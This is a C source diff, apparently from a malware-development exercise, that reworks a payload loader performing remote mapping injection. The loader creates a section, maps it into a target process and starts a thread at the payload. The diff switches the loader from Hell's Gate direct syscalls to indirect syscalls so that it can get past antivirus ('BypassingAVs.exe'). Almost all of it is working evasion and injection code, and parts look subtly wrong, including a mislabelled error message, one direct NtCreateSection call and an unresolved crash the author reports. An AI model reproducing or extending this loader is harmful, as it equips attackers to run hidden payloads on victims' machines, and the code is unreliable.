@@ -1,5 +1,6 @@
 #include "Common.h"
 #include "Resource.h"
+#include "SysWhispers.h"
 
 BOOL LoadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSize)
 {
@@ -113,9 +114,23 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 	SIZE_T          sViewSize = 0;
 	DWORD           dwLocalFlag = bIsLocalInjection ? PAGE_EXECUTE_READWRITE : PAGE_READWRITE;
 
-	// Allocating local map view 
-	HellsGate(g_SyscallsTable.NtCreateSection.wSystemCall);
-	if (status = HellDescent(
+	/// Allocating local map view
+	//HellsGate(g_SyscallsTable.NtCreateSection.wSystemCall);
+	//if (status = HellDescent(
+	//	&hSection,
+	//	SECTION_ALL_ACCESS,
+	//	NULL,
+	//	&liMaxSize,
+	//	PAGE_EXECUTE_READWRITE,
+	//	SEC_COMMIT,
+	//	NULL
+	//) != 0) {
+	//	PRINTA("[!] NtCreateSection Failed With Error : 0x%0.8X \n", status);
+	//	return FALSE;
+	//}
+	/// ENHANCEMENT: Using Hell's Gate with indirect syscall
+	OpenDoor(g_SyscallsTable.NtCreateSection.wSystemCall);
+	if ((status = NtCreateSection(
 		&hSection,
 		SECTION_ALL_ACCESS,
 		NULL,
@@ -123,13 +138,26 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 		PAGE_EXECUTE_READWRITE,
 		SEC_COMMIT,
 		NULL
-	) != 0) {
+	)) != 0) {
 		PRINTA("[!] NtCreateSection Failed With Error : 0x%0.8X \n", status);
 		return FALSE;
 	}
-
-	HellsGate(g_SyscallsTable.NtMapViewOfSection.wSystemCall);
-	if (status = HellDescent(
+	//HellsGate(g_SyscallsTable.NtMapViewOfSection.wSystemCall);
+	//if (status = HellDescent(
+	//	hSection,
+	//	GetCurrentProcessHandle(),
+	//	&pAllocatedAddress,
+	//	NULL, NULL, NULL,
+	//	&sViewSize,
+	//	ViewShare,
+	//	NULL,
+	//	dwLocalFlag
+	//) != 0) {
+	//	PRINTA("[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n", status);
+	//	return FALSE;
+	//}
+	OpenDoor(g_SyscallsTable.NtMapViewOfSection.wSystemCall);
+	if ((status = GoToDoor(
 		hSection,
 		GetCurrentProcessHandle(),
 		&pAllocatedAddress,
@@ -138,8 +166,8 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 		ViewShare,
 		NULL,
 		dwLocalFlag
-	) != 0) {
-		PRINTA("[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n", status);
+	)) != 0) {
+		PRINTA("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", status);
 		return FALSE;
 	}
 
@@ -154,8 +182,23 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 
 	// Allocating remote map view 
 	if (!bIsLocalInjection) {
-		HellsGate(g_SyscallsTable.NtMapViewOfSection.wSystemCall);
-		if ((status = HellDescent(
+		//HellsGate(g_SyscallsTable.NtMapViewOfSection.wSystemCall);
+		//if ((status = HellDescent(
+		//	hSection,
+		//	hProcess,
+		//	&pAllocatedRemoteAddress,
+		//	NULL, NULL, NULL,
+		//	&sViewSize,
+		//	ViewShare,
+		//	NULL,
+		//	PAGE_EXECUTE_READWRITE
+		//)) != 0x0) {
+		//	PRINTA("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", status);
+		//	return FALSE;
+		//}
+
+		OpenDoor(g_SyscallsTable.NtMapViewOfSection.wSystemCall);
+		if ((status = GoToDoor(
 			hSection,
 			hProcess,
 			&pAllocatedRemoteAddress,
@@ -187,8 +230,23 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 	GETCHAR();
 
 	PRINTA("\t[i] Running Thread Of Entry 0x%p ... ", pExecAddress);
-	HellsGate(g_SyscallsTable.NtCreateThreadEx.wSystemCall);
-	if ((HellDescent(
+	//HellsGate(g_SyscallsTable.NtCreateThreadEx.wSystemCall);
+	//if ((HellDescent(
+	//	&hThread,
+	//	THREAD_ALL_ACCESS,
+	//	NULL,
+	//	hProcess,
+	//	pExecAddress,
+	//	NULL,
+	//	NULL,
+	//	NULL, NULL, NULL,
+	//	NULL
+	//)) != 0x0) {
+	//	PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", status);
+	//	return FALSE;
+	//}
+	OpenDoor(g_SyscallsTable.NtCreateThreadEx.wSystemCall);
+	if ((GoToDoor(
 		&hThread,
 		THREAD_ALL_ACCESS,
 		NULL,
@@ -208,6 +266,8 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 	}
 
 	// Waiting for the thread to finish
+	/// !ERROR: somehow, I got this exception: 
+	/// "Unhandled exception at 0x00007FFD5DD16E99 (bcryptprimitives.dll) in BypassingAVs.exe: 0xC0000005: Access violation reading location 0xFFFFFFFFFFFFFFFF."
 	HellsGate(g_SyscallsTable.NtWaitForSingleObject.wSystemCall);
 	if ((status = HellDescent(
 		hThread,
